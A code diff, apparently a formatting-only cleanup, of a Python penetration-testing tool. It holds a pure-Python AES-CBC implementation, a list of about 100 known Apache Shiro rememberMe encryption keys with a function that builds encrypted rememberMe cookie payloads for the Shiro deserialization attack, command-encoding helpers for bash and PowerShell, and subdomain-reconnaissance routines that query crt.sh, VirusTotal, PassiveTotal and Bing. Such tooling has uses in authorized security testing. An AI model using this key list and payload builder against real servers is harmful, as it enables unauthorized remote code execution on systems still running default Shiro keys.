0x9e4f4fd1, 0xa3dcdc7f, 0x44222266, 0x542a2a7e, 0x3b9090ab, 0x0b888883, 0x8c4646ca, 0xc7eeee29, 0x6bb8b8d3, 0x2814143c, 0xa7dede79, 0xbc5e5ee2, 0x160b0b1d, 0xaddbdb76, 0xdbe0e03b, 0x64323256, 0x743a3a4e, 0x140a0a1e, 0x924949db, 0x0c06060a, 0x4824246c, 0xb85c5ce4, 0x9fc2c25d, 0xbdd3d36e, 0x43acacef, 0xc46262a6, 0x399191a8, 0x319595a4, 0xd3e4e437, 0xf279798b, 0xd5e7e732, 0x8bc8c843, 0x6e373759, 0xda6d6db7, 0x018d8d8c, 0xb1d5d564, 0x9c4e4ed2, 0x49a9a9e0, 0xd86c6cb4, 0xac5656fa, 0xf3f4f407, 0xcfeaea25, 0xca6565af, 0xf47a7a8e, 0x47aeaee9, 0x10080818, 0x6fbabad5, 0xf0787888, 0x4a25256f, 0x5c2e2e72, 0x381c1c24, 0x57a6a6f1, 0x73b4b4c7, 0x97c6c651, 0xcbe8e823, 0xa1dddd7c, 0xe874749c, 0x3e1f1f21, 0x964b4bdd, 0x61bdbddc, 0x0d8b8b86, 0x0f8a8a85, 0xe0707090, 0x7c3e3e42, 0x71b5b5c4, 0xcc6666aa, 0x904848d8, 0x06030305, 0xf7f6f601, 0x1c0e0e12, 0xc26161a3, 0x6a35355f, 0xae5757f9, 0x69b9b9d0, 0x17868691, 0x99c1c158, 0x3a1d1d27, 0x279e9eb9, 0xd9e1e138, 0xebf8f813, 0x2b9898b3, 0x22111133, 0xd26969bb, 0xa9d9d970, 0x078e8e89, 0x339494a7, 0x2d9b9bb6, 0x3c1e1e22, 0x15878792, 0xc9e9e920, 0x87cece49, 0xaa5555ff, 0x50282878, 0xa5dfdf7a, 0x038c8c8f, 0x59a1a1f8, 0x09898980, 0x1a0d0d17, 0x65bfbfda, 0xd7e6e631, 0x844242c6, 0xd06868b8, 0x824141c3, 0x299999b0, 0x5a2d2d77, 0x1e0f0f11, 0x7bb0b0cb, 0xa85454fc, 0x6dbbbbd6, 0x2c16163a ]
@@ -4363,7 +4501,7 @@ class AES:
         KC = len(key) // 4
 
         # Convert the key into ints
-        tk = [ struct.unpack(">i", key[i:i + 4])[0] for i in range(0, len(key), 4) ]
+        tk = [struct.unpack(">i", key[i : i + 4])[0] for i in range(0, len(key), 4)]
 
         # Copy values into round key arrays
         for i in range(0, KC):
@@ -4376,11 +4514,13 @@ class AES:
         while t < round_key_count:
 
             tt = tk[KC - 1]
-            tk[0] ^= ((self.S[(tt >> 16) & 0xFF] << 24) ^
-                      (self.S[(tt >>  8) & 0xFF] << 16) ^
-                      (self.S[ tt        & 0xFF] <<  8) ^
-                       self.S[(tt >> 24) & 0xFF]        ^
-                      (self.rcon[rconpointer] << 24))
+            tk[0] ^= (
+                (self.S[(tt >> 16) & 0xFF] << 24)
+                ^ (self.S[(tt >> 8) & 0xFF] << 16)
+                ^ (self.S[tt & 0xFF] << 8)
+                ^ self.S[(tt >> 24) & 0xFF]
+                ^ (self.rcon[rconpointer] << 24)
+            )
             rconpointer += 1
 
             if KC != 8:
@@ -4393,10 +4533,12 @@ class AES:
                     tk[i] ^= tk[i - 1]
                 tt = tk[KC // 2 - 1]
 
-                tk[KC // 2] ^= (self.S[tt& 0xFF]^
-                               (self.S[(tt >>  8) & 0xFF] <<  8) ^
-                               (self.S[(tt >> 16) & 0xFF] << 16) ^
-                               (self.S[(tt >> 24) & 0xFF] << 24))
+                tk[KC // 2] ^= (
+                    self.S[tt & 0xFF]
+                    ^ (self.S[(tt >> 8) & 0xFF] << 8)
+                    ^ (self.S[(tt >> 16) & 0xFF] << 16)
+                    ^ (self.S[(tt >> 24) & 0xFF] << 24)
+                )
 
                 for i in range(KC // 2 + 1, KC):
                     tk[i] ^= tk[i - 1]
@@ -4413,27 +4555,35 @@ class AES:
         for r in range(1, rounds):
             for j in range(0, 4):
                 tt = self._Kd[r][j]
-                self._Kd[r][j] = (self.U1[(tt >> 24) & 0xFF] ^
-                                  self.U2[(tt >> 16) & 0xFF] ^
-                                  self.U3[(tt >>  8) & 0xFF] ^
-                                  self.U4[tt & 0xFF])
+                self._Kd[r][j] = (
+                    self.U1[(tt >> 24) & 0xFF]
+                    ^ self.U2[(tt >> 16) & 0xFF]
+                    ^ self.U3[(tt >> 8) & 0xFF]
+                    ^ self.U4[tt & 0xFF]
+                )
 
-    def encrypt(self, plaintext):        
+    def encrypt(self, plaintext):
         rounds = len(self._Ke) - 1
         (s1, s2, s3) = [1, 2, 3]
         a = [0, 0, 0, 0]
 
         def _compact_word(word):
             return (word[0] << 24) | (word[1] << 16) | (word[2] << 8) | word[3]
-        t = [(_compact_word(plaintext[4 * i:4 * i + 4]) ^ self._Ke[0][i]) for i in range(0, 4)]
+
+        t = [
+            (_compact_word(plaintext[4 * i : 4 * i + 4]) ^ self._Ke[0][i])
+            for i in range(0, 4)
+        ]
 
         for r in range(1, rounds):
             for i in range(0, 4):
-                a[i] = (self.T1[(t[i] >> 24) & 0xFF] ^
-                        self.T2[(t[(i + s1) % 4] >> 16) & 0xFF] ^
-                        self.T3[(t[(i + s2) % 4] >>  8) & 0xFF] ^
-                        self.T4[ t[(i + s3) % 4] & 0xFF] ^
-                        self._Ke[r][i])
+                a[i] = (
+                    self.T1[(t[i] >> 24) & 0xFF]
+                    ^ self.T2[(t[(i + s1) % 4] >> 16) & 0xFF]
+                    ^ self.T3[(t[(i + s2) % 4] >> 8) & 0xFF]
+                    ^ self.T4[t[(i + s3) % 4] & 0xFF]
+                    ^ self._Ke[r][i]
+                )
             t = copy.copy(a)
 
         # The last round is special
@@ -4442,13 +4592,13 @@ class AES:
             tt = self._Ke[rounds][i]
             result.append((self.S[(t[i] >> 24) & 0xFF] ^ (tt >> 24)) & 0xFF)
             result.append((self.S[(t[(i + s1) % 4] >> 16) & 0xFF] ^ (tt >> 16)) & 0xFF)
-            result.append((self.S[(t[(i + s2) % 4] >>  8) & 0xFF] ^ (tt >>  8)) & 0xFF)
+            result.append((self.S[(t[(i + s2) % 4] >> 8) & 0xFF] ^ (tt >> 8)) & 0xFF)
             result.append((self.S[t[(i + s3) % 4] & 0xFF] ^ tt) & 0xFF)
 
         return result
 
-class AESModeOfOperationCBC:
 
+class AESModeOfOperationCBC:
     def __init__(self, key, iv=None):
         self._aes = AES(key)
         if iv is None:
@@ -4465,7 +4615,7 @@ class AESModeOfOperationCBC:
     def encrypt(self, plaintext):
 
         plaintext = self._string_to_bytes(plaintext)
-        precipherblock = [(p^l) for (p, l) in zip(plaintext, self._last_cipherblock) ]
+        precipherblock = [(p ^ l) for (p, l) in zip(plaintext, self._last_cipherblock)]
         self._last_cipherblock = self._aes.encrypt(precipherblock)
 
         def _bytes_to_string(binary):
@@ -4473,62 +4623,109 @@ class AESModeOfOperationCBC:
                 return bytes(binary)
             return "".join(chr(b) for b in binary)
 
-
         return _bytes_to_string(self._last_cipherblock)
 
-class shiro_key_generate:
 
+class shiro_key_generate:
     def keys(self):
         return (
-            "4AvVhmFLUs0KTA3Kprsdag==", "kPH+bIxk5D2deZiIxcaaaA==",
-            "Z3VucwAAAAAAAAAAAAAAAA==", "fCq+/xW488hMTCD+cmJ3aQ==",
-            "0AvVhmFLUs0KTA3Kprsdag==", "1AvVhdsgUs0FSA3SDFAdag==",
-            "1QWLxg+NYmxraMoxAXu/Iw==", "25BsmdYwjnfcWmnhAciDDg==",
-            "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==",
-            "3JvYhmBLUs0ETA5Kprsdag==", "r0e3c16IdVkouZgk1TKVMg==",
-            "5aaC5qKm5oqA5pyvAAAAAA==", "5AvVhmFLUs0KTA3Kprsdag==",
-            "6AvVhmFLUs0KTA3Kprsdag==", "6NfXkC7YVCV5DASIrEm1Rg==",
-            "6ZmI6I2j5Y+R5aSn5ZOlAA==", "cmVtZW1iZXJNZQAAAAAAAA==",
-            "7AvVhmFLUs0KTA3Kprsdag==", "8AvVhmFLUs0KTA3Kprsdag==",
-            "8BvVhmFLUs0KTA3Kprsdag==", "9AvVhmFLUs0KTA3Kprsdag==",
-            "OUHYQzxQ/W9e/UjiAGu6rg==", "a3dvbmcAAAAAAAAAAAAAAA==",
-            "aU1pcmFjbGVpTWlyYWNsZQ==", "bWljcm9zAAAAAAAAAAAAAA==",
-            "bWluZS1hc3NldC1rZXk6QQ==", "bXRvbnMAAAAAAAAAAAAAAA==",
-            "ZUdsaGJuSmxibVI2ZHc9PQ==", "wGiHplamyXlVB11UXWol8g==",
-            "U3ByaW5nQmxhZGUAAAAAAA==", "MTIzNDU2Nzg5MGFiY2RlZg==",
-            "L7RioUULEFhRyxM7a2R/Yg==", "a2VlcE9uR29pbmdBbmRGaQ==",
-            "WcfHGU25gNnTxTlmJMeSpw==", "XgGkgqGqYrix9lI6vxcrRw==",
-            "OY//C4rhfwNxCQAQCrQQ1Q==", "5J7bIJIV0LQSN3c9LPitBQ==",
-            "f/SY5TIve5WWzT4aQlABJA==", "bya2HkYo57u6fWh5theAWw==",
-            "WuB+y2gcHRnY2Lg9+Aqmqg==", "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
-            "3qDVdLawoIr1xFd6ietnwg==", "YI1+nBV//m7ELrIyDHm6DQ==",
-            "6Zm+6I2j5Y+R5aS+5ZOlAA==", "2A2V+RFLUs+eTA3Kpr+dag==",
-            "6ZmI6I2j3Y+R1aSn5BOlAA==", "SkZpbmFsQmxhZGUAAAAAAA==",
-            "2cVtiE83c4lIrELJwKGJUw==", "SDKOLKn2J1j/2BHjeZwAoQ==",
-            "fsHspZw/92PrS3XrPW+vxw==", "XTx6CKLo/SdSgub+OPHSrw==",
-            "sHdIjUN6tzhl8xZMG3ULCQ==", "O4pdf+7e+mZe8NyxMTPJmQ==",
-            "HWrBltGvEZc14h9VpMvZWw==", "rPNqM6uKFCyaL10AK51UkQ==",
-            "Y1JxNSPXVwMkyvES/kJGeQ==", "lT2UvDUmQwewm6mMoiw4Ig==",
-            "MPdCMZ9urzEA50JDlDYYDg==", "xVmmoltfpb8tTceuT5R7Bw==",
-            "c+3hFGPjbgzGdrC+MHgoRQ==", "ClLk69oNcA3m+s0jIMIkpg==",
-            "Bf7MfkNR0axGGptozrebag==", "1tC/xrDYs8ey+sa3emtiYw==",
-            "ZmFsYWRvLnh5ei5zaGlybw==", "cGhyYWNrY3RmREUhfiMkZA==",
-            "IduElDUpDDXE677ZkhhKnQ==", "yeAAo1E8BOeAYfBlm4NG9Q==",
-            "cGljYXMAAAAAAAAAAAAAAA==", "2itfW92XazYRi5ltW0M2yA==",
-            "ertVhmFLUs0KTA3Kprsdag==", "5AvVhmFLUS0ATA4Kprsdag==",
-            "s0KTA3mFLUprK4AvVhsdag==", "hBlzKg78ajaZuTE0VLzDDg==",
-            "9FvVhtFLUs0KnA3Kprsdyg==", "d2ViUmVtZW1iZXJNZUtleQ==",
-            "yNeUgSzL/CfiWw1GALg6Ag==", "NGk/3cQ6F5/UNPRh8LpMIg==",
-            "4BvVhmFLUs0KTA3Kprsdag==", "MzVeSkYyWTI2OFVLZjRzZg==",
-            "empodDEyMwAAAAAAAAAAAA==", "A7UzJgh1+EWj5oBFi+mSgw==", 
-            "c2hpcm9fYmF0aXMzMgAAAA==", "i45FVt72K2kLgvFrJtoZRw==", 
-            "U3BAbW5nQmxhZGUAAAAAAA==", "ZnJlc2h6Y24xMjM0NTY3OA==", 
-            "Jt3C93kMR9D5e8QzwfsiMw==", "MTIzNDU2NzgxMjM0NTY3OA==", 
-            "vXP33AonIp9bFwGl7aT7rA==", "V2hhdCBUaGUgSGVsbAAAAA==", 
-            "Q01TX0JGTFlLRVlfMjAxOQ==", "ZAvph3dsQs0FSL3SDFAdag==", 
-            "Is9zJ3pzNh2cgTHB4ua3+Q==", "NsZXjXVklWPZwOfkvk6kUA==", 
-            "GAevYnznvgNCURavBhCr1w==", "66v1O8keKNV3TTcGPK1wzg=="
-            )
+            "4AvVhmFLUs0KTA3Kprsdag==",
+            "kPH+bIxk5D2deZiIxcaaaA==",
+            "Z3VucwAAAAAAAAAAAAAAAA==",
+            "fCq+/xW488hMTCD+cmJ3aQ==",
+            "0AvVhmFLUs0KTA3Kprsdag==",
+            "1AvVhdsgUs0FSA3SDFAdag==",
+            "1QWLxg+NYmxraMoxAXu/Iw==",
+            "25BsmdYwjnfcWmnhAciDDg==",
+            "2AvVhdsgUs0FSA3SDFAdag==",
+            "3AvVhmFLUs0KTA3Kprsdag==",
+            "3JvYhmBLUs0ETA5Kprsdag==",
+            "r0e3c16IdVkouZgk1TKVMg==",
+            "5aaC5qKm5oqA5pyvAAAAAA==",
+            "5AvVhmFLUs0KTA3Kprsdag==",
+            "6AvVhmFLUs0KTA3Kprsdag==",
+            "6NfXkC7YVCV5DASIrEm1Rg==",
+            "6ZmI6I2j5Y+R5aSn5ZOlAA==",
+            "cmVtZW1iZXJNZQAAAAAAAA==",
+            "7AvVhmFLUs0KTA3Kprsdag==",
+            "8AvVhmFLUs0KTA3Kprsdag==",
+            "8BvVhmFLUs0KTA3Kprsdag==",
+            "9AvVhmFLUs0KTA3Kprsdag==",
+            "OUHYQzxQ/W9e/UjiAGu6rg==",
+            "a3dvbmcAAAAAAAAAAAAAAA==",
+            "aU1pcmFjbGVpTWlyYWNsZQ==",
+            "bWljcm9zAAAAAAAAAAAAAA==",
+            "bWluZS1hc3NldC1rZXk6QQ==",
+            "bXRvbnMAAAAAAAAAAAAAAA==",
+            "ZUdsaGJuSmxibVI2ZHc9PQ==",
+            "wGiHplamyXlVB11UXWol8g==",
+            "U3ByaW5nQmxhZGUAAAAAAA==",
+            "MTIzNDU2Nzg5MGFiY2RlZg==",
+            "L7RioUULEFhRyxM7a2R/Yg==",
+            "a2VlcE9uR29pbmdBbmRGaQ==",
+            "WcfHGU25gNnTxTlmJMeSpw==",
+            "XgGkgqGqYrix9lI6vxcrRw==",
+            "OY//C4rhfwNxCQAQCrQQ1Q==",
+            "5J7bIJIV0LQSN3c9LPitBQ==",
+            "f/SY5TIve5WWzT4aQlABJA==",
+            "bya2HkYo57u6fWh5theAWw==",
+            "WuB+y2gcHRnY2Lg9+Aqmqg==",
+            "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
+            "3qDVdLawoIr1xFd6ietnwg==",
+            "YI1+nBV//m7ELrIyDHm6DQ==",
+            "6Zm+6I2j5Y+R5aS+5ZOlAA==",
+            "2A2V+RFLUs+eTA3Kpr+dag==",
+            "6ZmI6I2j3Y+R1aSn5BOlAA==",
+            "SkZpbmFsQmxhZGUAAAAAAA==",
+            "2cVtiE83c4lIrELJwKGJUw==",
+            "SDKOLKn2J1j/2BHjeZwAoQ==",
+            "fsHspZw/92PrS3XrPW+vxw==",
+            "XTx6CKLo/SdSgub+OPHSrw==",
+            "sHdIjUN6tzhl8xZMG3ULCQ==",
+            "O4pdf+7e+mZe8NyxMTPJmQ==",
+            "HWrBltGvEZc14h9VpMvZWw==",
+            "rPNqM6uKFCyaL10AK51UkQ==",
+            "Y1JxNSPXVwMkyvES/kJGeQ==",
+            "lT2UvDUmQwewm6mMoiw4Ig==",
+            "MPdCMZ9urzEA50JDlDYYDg==",
+            "xVmmoltfpb8tTceuT5R7Bw==",
+            "c+3hFGPjbgzGdrC+MHgoRQ==",
+            "ClLk69oNcA3m+s0jIMIkpg==",
+            "Bf7MfkNR0axGGptozrebag==",
+            "1tC/xrDYs8ey+sa3emtiYw==",
+            "ZmFsYWRvLnh5ei5zaGlybw==",
+            "cGhyYWNrY3RmREUhfiMkZA==",
+            "IduElDUpDDXE677ZkhhKnQ==",
+            "yeAAo1E8BOeAYfBlm4NG9Q==",
+            "cGljYXMAAAAAAAAAAAAAAA==",
+            "2itfW92XazYRi5ltW0M2yA==",
+            "ertVhmFLUs0KTA3Kprsdag==",
+            "5AvVhmFLUS0ATA4Kprsdag==",
+            "s0KTA3mFLUprK4AvVhsdag==",
+            "hBlzKg78ajaZuTE0VLzDDg==",
+            "9FvVhtFLUs0KnA3Kprsdyg==",
+            "d2ViUmVtZW1iZXJNZUtleQ==",
+            "yNeUgSzL/CfiWw1GALg6Ag==",
+            "NGk/3cQ6F5/UNPRh8LpMIg==",
+            "4BvVhmFLUs0KTA3Kprsdag==",
+            "MzVeSkYyWTI2OFVLZjRzZg==",
+            "empodDEyMwAAAAAAAAAAAA==",
+            "A7UzJgh1+EWj5oBFi+mSgw==",
+            "c2hpcm9fYmF0aXMzMgAAAA==",
+            "i45FVt72K2kLgvFrJtoZRw==",
+            "U3BAbW5nQmxhZGUAAAAAAA==",
+            "ZnJlc2h6Y24xMjM0NTY3OA==",
+            "Jt3C93kMR9D5e8QzwfsiMw==",
+            "MTIzNDU2NzgxMjM0NTY3OA==",
+            "vXP33AonIp9bFwGl7aT7rA==",
+            "V2hhdCBUaGUgSGVsbAAAAA==",
+            "Q01TX0JGTFlLRVlfMjAxOQ==",
+            "ZAvph3dsQs0FSL3SDFAdag==",
+            "Is9zJ3pzNh2cgTHB4ua3+Q==",
+            "NsZXjXVklWPZwOfkvk6kUA==",
+            "GAevYnznvgNCURavBhCr1w==",
+            "66v1O8keKNV3TTcGPK1wzg==",
+        )
 
     def generate_payload(self, key):
         BS = 16
@@ -4537,87 +4734,99 @@ class shiro_key_generate:
         pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
         iv = uuid.uuid4().bytes
         file_body = pad(bb)
-        aes = AESModeOfOperationCBC(base64.b64decode(key), iv = iv)
+        aes = AESModeOfOperationCBC(base64.b64decode(key), iv=iv)
         aa = b""
-        for i in range(0, int(len(file_body)/16)):
-            caotm = file_body[16 * i: 16*(i+1)]
+        for i in range(0, int(len(file_body) / 16)):
+            caotm = file_body[16 * i : 16 * (i + 1)]
             aa += aes.encrypt(caotm)
-        base64_aa = base64.b64encode(iv+aa)
+        base64_aa = base64.b64encode(iv + aa)
 
         return base64_aa
 
 
-def hcode(method,strings):
+def hcode(method, strings):
     if PYVERSION > "3.0":
         print(bingo("-") + " Please use python 2.x")
         sys.exit()
-        
+
     ucode = coding()
     if method == "f5":
-        print(r"""
+        print(
+            r"""
               __ _____     _                    _      
              / _| ____|   | |                  | |     
             | |_| |__   __| | ___  ___ ___   __| | ___ 
             |  _|___ \ / _` |/ _ \/ __/ _ \ / _` |/ _ \
             | |  ___) | (_| |  __/ (_| (_) | (_| |  __/
             |_| |____/ \__,_|\___|\___\___/ \__,_|\___|    
-        """)
+        """
+        )
         ucode.f5(strings)
 
     elif method == "bh":
-        print(r"""
+        print(
+            r"""
            _                   _
           | |__   ___ ___   __| | ___
           | "_ \ / __/ _ \ / _` |/ _ \
           | |_) | (_| (_) | (_| |  __/
           |_.__/ \___\___/ \__,_|\___|
-        """)
+        """
+        )
         ucode.bash(strings)
 
     elif method == "pw":
-        print(r"""
+        print(
+            r"""
            _ ____      _____   ___ _ __ ___ ___   __| | ___
           | "_ \ \ /\ / / _ \ / _ \ "__/ __/ _ \ / _` |/ _ \
           | |_) \ V  V / (_) |  __/ | | (_| (_) | (_| |  __/
           | .__/ \_/\_/ \___/ \___|_|  \___\___/ \__,_|\___|
           |_|
-        """)
+        """
+        )
         ucode.powershell(strings)
 
     elif method == "seeyon":
-        print(r"""
+        print(
+            r"""
            ____                     
           / __/__ ___ __ _____  ___ 
          _\ \/ -_) -_) // / _ \/ _ \
         /___/\__/\__/\_, /\___/_//_/
                     /___/           
-        """)
+        """
+        )
         ucode.seeyon(strings)
-
-
 
 
 # rows, columns = os.popen("stty size", "r").read().split()
 class ProgressBar:
     DEFAULT = "Progress: %(bar)s %(percent)3d%%"
-    FULL = "%(bar)s %(current)d" + yellow("/") + "%(total)d (%(percent)3d%%) %(remaining)d " + yellow("to Go")+"\r"
+    FULL = (
+        "%(bar)s %(current)d"
+        + yellow("/")
+        + "%(total)d (%(percent)3d%%) %(remaining)d "
+        + yellow("to Go")
+        + "\r"
+    )
 
-    def __init__(self, total, width=30, fmt=DEFAULT, symbol=yellow(">"), output=sys.stdout):
-        #assert len(symbol) == 1
+    def __init__(
+        self, total, width=30, fmt=DEFAULT, symbol=yellow(">"), output=sys.stdout
+    ):
+        # assert len(symbol) == 1
         global locks
         self.total = total
         self.width = width
         self.symbol = symbol
         self.output = output
-        self.fmt = re.sub(r"(?P<name>%\(.+?\))d",
-            r"\g<name>%dd" % len(str(total)), fmt)
+        self.fmt = re.sub(r"(?P<name>%\(.+?\))d", r"\g<name>%dd" % len(str(total)), fmt)
 
         self.current = 0
         self.lock = locks
-        
 
     def __call__(self):
-        
+
         percent = self.current / float(self.total)
         size = int(self.width * percent)
         remaining = self.total - self.current
@@ -4628,7 +4837,7 @@ class ProgressBar:
             "bar": bar,
             "current": self.current,
             "percent": percent * 100,
-            "remaining": remaining
+            "remaining": remaining,
         }
 
         self.lock.acquire(1)
@@ -4638,7 +4847,6 @@ class ProgressBar:
         self.lock.release()
         time.sleep(0.01)
 
-
     def dones(self):
         self.current = self.total
         self()
@@ -4646,13 +4854,15 @@ class ProgressBar:
         sys.stdout.flush()
         self()
 
-progress = ProgressBar(999999, fmt=ProgressBar.FULL) # global process_bar
+
+progress = ProgressBar(999999, fmt=ProgressBar.FULL)  # global process_bar
 progress_num = 0
 temp = 0
 scaned = 0
 
 
 headers = {}
+
 
 def swithHeader(options):
     global headers
@@ -4674,24 +4884,16 @@ def swithHeader(options):
     ]
     UserAgent = random.choice(user_agent)
     if "sscan" in options:
-        headers = {
-            "User-Agent": UserAgent,
-            "Accept": "*/*",
-            "Connection": "close"
-        }
+        headers = {"User-Agent": UserAgent, "Accept": "*/*", "Connection": "close"}
     elif type(options) == dict:
-        headers = {
-            "User-Agent": UserAgent,
-            "Accept": "*/*",
-            "Connection": "close"
-        }
+        headers = {"User-Agent": UserAgent, "Accept": "*/*", "Connection": "close"}
         headers.update(options)
     else:
         headers = {
             "User-Agent": UserAgent,
             "Accept": "*/*",
             "Cookie": "rememberMe=xxx",
-            "Connection": "close"
+            "Connection": "close",
         }
 
 
@@ -4712,22 +4914,20 @@ GROUP_NAMES = {
     b"\x00": "Domain Name",
     b"\x1C": "Domain Controllers",
     b"\x1E": "Browser Service Elections",
-    
 }
 
 
 NetBIOS_ITEM_TYPE = {
-    b"\x01\x00":"NetBIOS computer name",
-    b"\x02\x00":"NetBIOS domain name",
-    b"\x03\x00":"DNS computer name",
-    b"\x04\x00":"DNS domain name",
-    b"\x05\x00":"DNS tree name",
-    
-    b"\x07\x00":"Time stamp",
+    b"\x01\x00": "NetBIOS computer name",
+    b"\x02\x00": "NetBIOS domain name",
+    b"\x03\x00": "DNS computer name",
+    b"\x04\x00": "DNS domain name",
+    b"\x05\x00": "DNS tree name",
+    b"\x07\x00": "Time stamp",
 }
 
 
-# duplicate remove for subdomain 
+# duplicate remove for subdomain
 def duprm(*subs):
     subdomain = []
     for esubs in subs:
@@ -4742,6 +4942,7 @@ class subscanProcess:
         self.query = query
         self.apikey = Account().Vtapikey()
         self.total = 4
+
     def crtscan(self):
         try:
             from urllib import quote
@@ -4759,15 +4960,23 @@ class subscanProcess:
                     crt.add_handler(urllib2.ProxyHandler({"https": proxy_host}))
                 elif proxy_type == "socks5":
                     proxy_h, proxy_port = proxy_host.split(":")
-                    crt.add_handler(SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port) ))
+                    crt.add_handler(
+                        SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port))
+                    )
                 elif proxy_type == "socks4":
                     proxy_h, proxy_port = proxy_host.split(":")
-                    crt.add_handler(SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port) ))
+                    crt.add_handler(
+                        SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port))
+                    )
             crt_result = crt.open(req, timeout=30).read()
             crt_result = crt_result.decode("utf-8")
-            for cert, domain in re.findall('<tr>(?:\s|\S)*?href="\?id=([0-9]+?)"(?:\s|\S)*?<td>([*_a-zA-Z0-9.-]+?\.' \
-               + re.escape(self.query) + ')</td>(?:\s|\S)*?</tr>',\
-                crt_result, re.IGNORECASE):
+            for cert, domain in re.findall(
+                '<tr>(?:\s|\S)*?href="\?id=([0-9]+?)"(?:\s|\S)*?<td>([*_a-zA-Z0-9.-]+?\.'
+                + re.escape(self.query)
+                + ")</td>(?:\s|\S)*?</tr>",
+                crt_result,
+                re.IGNORECASE,
+            ):
                 domain = domain.split("@")[-1]
                 domains.add(domain)
 
@@ -4787,33 +4996,39 @@ class subscanProcess:
     def vtsubdomain(self):
         result = []
         try:
-            urlapi = "https://www.virustotal.com/vtapi/v2/domain/report?apikey=%s&domain=%s" % (self.apikey, self.query)
+            urlapi = (
+                "https://www.virustotal.com/vtapi/v2/domain/report?apikey=%s&domain=%s"
+                % (self.apikey, self.query)
+            )
             ho = urllib2.OpenerDirector()
             ho.add_handler(urllib2.HTTPSHandler())
             req = urllib2.Request(urlapi)
             if proxy_type and proxy_host:
                 if proxy_type == "http":
-                    ho.add_handler(urllib2.ProxyHandler({"https":proxy_host}))
+                    ho.add_handler(urllib2.ProxyHandler({"https": proxy_host}))
                 elif proxy_type == "socks5":
                     proxy_h, proxy_port = proxy_host.split(":")
-                    ho.add_handler(SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port) ))
+                    ho.add_handler(
+                        SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port))
+                    )
                 elif proxy_type == "socks4":
                     proxy_h, proxy_port = proxy_host.split(":")
-                    ho.add_handler(SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port) ))
+                    ho.add_handler(
+                        SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port))
+                    )
             r = ho.open(req, timeout=30)
             r = json.loads(r.read())
-            if "subdomains" in r.keys() :
+            if "subdomains" in r.keys():
                 for res in r["subdomains"]:
                     result.append(res.split("." + self.query)[0])
             vtsing = info("VTS Request ") + str(len(result)) + " | "
             sys.stdout.write(vtsing)
             sys.stdout.flush()
         except Exception as e:
-            vtsing = PASSAT("VTS Request error")  + " | "
+            vtsing = PASSAT("VTS Request error") + " | "
             sys.stdout.write(vtsing)
             sys.stdout.flush()
         return result
-
 
     def passivetotal_get(self, path, json_using=True):
         """
@@ -4822,13 +5037,14 @@ class subscanProcess:
 
         keylist = Account().Riskiqkey()
 
-        # Adaptor python3 
+        # Adaptor python3
         if PYVERSION > "3.0":
             from urllib.parse import quote
+
             urllib.quote = quote
 
         def readapi():
-            
+
             auth = random.choice(keylist)
             auth_index = keylist.index(auth)
 
@@ -4838,9 +5054,9 @@ class subscanProcess:
             querys = urllib.quote(self.query)
 
             data = {"query": querys}
-            headers = {"Content-Type":"application/json"}
+            headers = {"Content-Type": "application/json"}
 
-            # Adaptor python3 
+            # Adaptor python3
 
             try:
                 base64string = base64.b64encode("%s:%s" % auth)
@@ -4849,11 +5065,10 @@ class subscanProcess:
                 b2encode = b2encode.encode("gb2312")
                 base64string = base64.b64encode(b2encode).decode("utf-8")
 
-            
             try:
                 if json_using:
 
-                    # Adaptor python3 
+                    # Adaptor python3
                     if PYVERSION > "3.0":
                         d = json.dumps(data)
                         d = d.encode("utf-8")
@@ -4863,7 +5078,6 @@ class subscanProcess:
                 else:
                     request = urllib2.Request(url)
                 request.add_header("Authorization", "Basic %s" % base64string)
-
 
                 res = urllib2.urlopen(request, timeout=10)
                 return res.read()
@@ -4881,11 +5095,12 @@ class subscanProcess:
                 if "timed out" in str(e):
                     return "timeout"
                 return None
+
         result = readapi()
-        while result =="402" or result == "401" or result == "timeout" :
+        while result == "402" or result == "401" or result == "timeout":
             if len(keylist) < 1:
                 pass
-            result=readapi()
+            result = readapi()
         return result
 
     def bing_domain(self):
@@ -4896,17 +5111,23 @@ class subscanProcess:
             # Location banner of bing
             ho = urllib2.OpenerDirector()
             ho.add_handler(urllib2.HTTPSHandler())
-            ho.add_handler(urllib2.HTTPSHandler(context=_create_unverified_https_context()))
+            ho.add_handler(
+                urllib2.HTTPSHandler(context=_create_unverified_https_context())
+            )
             req = urllib2.Request("https://bing.com", headers=bing_header)
             if proxy_type and proxy_host:
                 if proxy_type == "http":
-                    ho.add_handler(urllib2.ProxyHandler({"https":proxy_host}))
+                    ho.add_handler(urllib2.ProxyHandler({"https": proxy_host}))
                 elif proxy_type == "socks5":
                     proxy_h, proxy_port = proxy_host.split(":")
-                    ho.add_handler(SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port) ))
+                    ho.add_handler(
+                        SocksiPyHandler(socks.SOCKS5, proxy_h, int(proxy_port))
+                    )
                 elif proxy_type == "socks4":
                     proxy_h, proxy_port = proxy_host.split(":")
-                    ho.add_handler(SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port) ))
+                    ho.add_handler(
+                        SocksiPyHandler(socks.SOCKS4, proxy_h, int(proxy_port))
+                    )
             r = ho.open(req, timeout=3)
             localhost = r.info()["Location"]
 
@@ -4916,19 +5137,19 @@ class subscanProcess:
             req = urllib2.Request(localhost, headers=bing_header)
             r = ho.open(req, timeout=3)
 
-            bing_header.update({
-                "Cookie": r.info()["Set-Cookie"]
-            })
+            bing_header.update({"Cookie": r.info()["Set-Cookie"]})
 
             first = 0
             while True:
-                urlapi = localhost + "/search?q=site:%s&first=%d&count=50" % (self.query, first)
+                urlapi = localhost + "/search?q=site:%s&first=%d&count=50" % (
+                    self.query,
+                    first,
+                )
                 try:
                     req = urllib2.Request(urlapi, headers=bing_header)
                     r = ho.open(req, timeout=15)
                 except Exception as e:
                     break
-
                 data = r.read().decode()
                 pattern = re.compile(r"\<a.*?href=\"(.*?)\".*?\>")
                 patchs = pattern.findall(data)
